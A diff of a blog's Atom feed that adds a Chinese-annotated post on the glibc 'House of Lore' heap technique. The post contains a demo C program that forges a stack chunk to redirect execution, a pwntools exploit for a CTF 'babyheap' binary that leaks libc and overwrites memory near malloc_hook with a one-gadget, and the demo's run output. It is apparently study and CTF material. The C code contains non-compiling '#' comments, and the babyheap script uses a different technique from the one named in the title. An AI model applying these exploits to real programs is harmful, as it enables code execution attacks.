@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://czh11.github.io</id>
     <title>Nono</title>
-    <updated>2020-12-16T03:34:46.027Z</updated>
+    <updated>2020-12-16T12:50:52.781Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://czh11.github.io"/>
     <link rel="self" href="https://czh11.github.io/atom.xml"/>
@@ -10,6 +10,213 @@
     <logo>https://czh11.github.io/images/avatar.png</logo>
     <icon>https://czh11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Nono</rights>
+    <entry>
+        <title type="html"><![CDATA[House of lore]]></title>
+        <id>https://czh11.github.io/post/house-of-lore/</id>
+        <link href="https://czh11.github.io/post/house-of-lore/">
+        </link>
+        <updated>2020-12-16T12:25:21.000Z</updated>
+        <content type="html"><![CDATA[<p>利用前提：</p>
+<p>控制Small Bin Chunk的bk指针，控制指定位置chunk的fd指针</p>
+<p>实现分配任意指定位置的chunk，修改任意地址的内存</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+
+void jackpot(){ puts(&quot;Nice jump d00d&quot;); exit(0); }
+
+int main(int argc, char * argv[]){
+
+
+  intptr_t* stack_buffer_1[4] = {0};
+  intptr_t* stack_buffer_2[3] = {0};
+
+  fprintf(stderr, &quot;\nWelcome to the House of Lore\n&quot;);
+  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;);
+  fprintf(stderr, &quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;);
+
+  fprintf(stderr, &quot;Allocating the victim chunk\n&quot;);
+  intptr_t *victim = malloc(100);
+  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\n&quot;, victim);
+
+  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
+  intptr_t *victim_chunk = victim-2;#得到chunk头的地址
+
+  fprintf(stderr, &quot;stack_buffer_1 at %p\n&quot;, (void*)stack_buffer_1);
+  fprintf(stderr, &quot;stack_buffer_2 at %p\n&quot;, (void*)stack_buffer_2);
+
+  fprintf(stderr, &quot;Create a fake chunk on the stack&quot;);
+  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;
+         &quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;);
+  stack_buffer_1[0] = 0;
+  stack_buffer_1[1] = 0;
+  stack_buffer_1[2] = victim_chunk;#把chunk的地址给它，满足bck-&gt;fd=!victim的检测
+
+  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;
+         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;
+         &quot;chunk on stack&quot;);
+  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
+  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
+
+  fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;
+         &quot;the small one during the free()\n&quot;);
+  void *p5 = malloc(1000);#防止free点chunk1后合并到top chunk
+  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\n&quot;, p5);
+
+
+  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);
+  free((void*)victim);
+
+  fprintf(stderr, &quot;\nIn the unsorted bin the victim's fwd and bk pointers are nil\n&quot;);
+  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
+  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);
+
+  fprintf(stderr, &quot;Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n&quot;);
+  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;, victim);
+
+  void *p2 = malloc(1200);#通过再unsorted bins中没找到合适的chunk，使得chunk1进入small bins中
+  fprintf(stderr, &quot;The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;, p2);
+
+  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;);
+  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
+  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);
+
+  //------------VULNERABILITY-----------
+
+  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);
+
+  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack
+
+  //------------------------------------
+
+  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\n&quot;);
+  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;);
+
+  void *p3 = malloc(100);#申请到chunk1
+
+
+  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;);
+  char *p4 = malloc(100);#申请到fake chunk
+  fprintf(stderr, &quot;p4 = malloc(100)\n&quot;);
+
+  fprintf(stderr, &quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;,
+         stack_buffer_2[2]);
+
+  fprintf(stderr, &quot;\np4 is %p and should be on the stack!\n&quot;, p4); // this chunk will be allocated on stack
+  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+}
+</code></pre>
+<pre><code>#!/usr/bin/env python2
+#-*- coding:utf-8 -*
+from pwn import *
+from LibcSearcher import *
+context.log_level='debug'
+r=process(&quot;./babyheap&quot;)
+def add(size):
+    r.recvuntil(&quot;Command: &quot;)
+    r.sendline(&quot;1&quot;)
+    r.recvuntil(&quot;Size: &quot;)
+    r.sendline(str(size))
+def fill(index,size,content):
+    r.recvuntil(&quot;Command: &quot;)
+    r.sendline(&quot;2&quot;)
+    r.recvuntil(&quot;Index: &quot;)
+    r.sendline(str(index))
+    r.recvuntil(&quot;Size: &quot;)
+    r.sendline(str(size))
+    r.recvuntil(&quot;Content: &quot;)
+    r.send(content)
+def free(index):
+    r.recvuntil(&quot;Command: &quot;)
+    r.sendline(&quot;3&quot;)
+    r.recvuntil(&quot;Index: &quot;)
+    r.sendline(str(index))
+def dump(index):
+    r.recvuntil(&quot;Command: &quot;)
+    r.sendline(&quot;4&quot;)
+    r.recvuntil(&quot;Index: &quot;)
+    r.sendline(str(index))
+gdb.attach(r)
+add(0x10)#chunk0
+add(0x10)#chunk1
+add(0x10)#chunk2
+add(0x10)#chunk3
+add(0x80)#chunk4
+add(0x80)#chunk5
+free(2)#free chunk2
+free(1)#free chunk1
+payload='a'*0x10+p64(0)+p64(0x21)+p8(0x80)#堆的始终是 4KB 对齐的，所以chunk4的起始地址的第一个字节必然是0x80
+fill(0,len(payload),payload)
+payload='a'*0x10+p64(0)+p64(0x21)
+fill(3,len(payload),payload)
+add(0x10)#chunk1
+add(0x10)#chunk2
+payload='a'*0x10+p64(0)+p64(0x91)
+fill(3,len(payload),payload)
+free(4)#free chunk4
+dump(2)
+r.recvuntil(&quot;Content: &quot;)
+main_arena=u64(r.recv()[1:8].ljust(8,'\x00'))-88
+main_arena_offset=0x3c3b20
+libcbase=main_arena-main_arena_offset
+onegadget=libcbase+0x4525a
+print(hex(onegadget))
+print(hex(main_arena))
+add(0x60)#chunk4
+free(4)
+fake_chunk=main_arena-0x33
+payload='a'*0x10+p64(0)+p64(0x71)+p64(fake_chunk)
+fill(3,len(payload),payload)
+add(0x60)#chunk4
+add(0x60)#chunk6
+payload='a'*0x13+p64(onegadget)
+fill(6,len(payload),payload)
+add(0x90)
+r.interactive()
+</code></pre>
+<p>运行结果</p>
+<pre><code>giantbranch@ubuntu:~/Desktop$ ./lore
+
+Welcome to the House of Lore
+This is a revisited version that bypass also the hardening check introduced by glibc malloc
+This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23
+
+Allocating the victim chunk
+Allocated the first small chunk on the heap at 0x944010
+stack_buffer_1 at 0x7ffd43b1f810
+stack_buffer_2 at 0x7ffd43b1f7f0
+Create a fake chunk on the stackSet the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
+Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
+Allocated the large chunk on the heap at 0x944080
+Freeing the chunk 0x944010, it will be inserted in the unsorted bin
+
+In the unsorted bin the victim's fwd and bk pointers are nil
+victim-&gt;fwd: (nil)
+victim-&gt;bk: (nil)
+
+Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
+This means that the chunk 0x944010 will be inserted in front of the SmallBin
+The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x944470
+The victim chunk has been sorted and its fwd and bk pointers updated
+victim-&gt;fwd: 0x7fb50942abd8
+victim-&gt;bk: 0x7fb50942abd8
+
+Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
+Now allocating a chunk with size equal to the first one freed
+This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer
+This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk
+p4 = malloc(100)
+
+The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fb50942abd8
+
+p4 is 0x7ffd43b1f820 and should be on the stack!
+Nice jump d00d
+giantbranch@ubuntu:~/Desktop$ 
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[通过修改ebp改变程序的走向]]></title>
         <id>https://czh11.github.io/post/tong-guo-xiu-gai-ebp-gai-bian-cheng-xu-de-zou-xiang/</id>
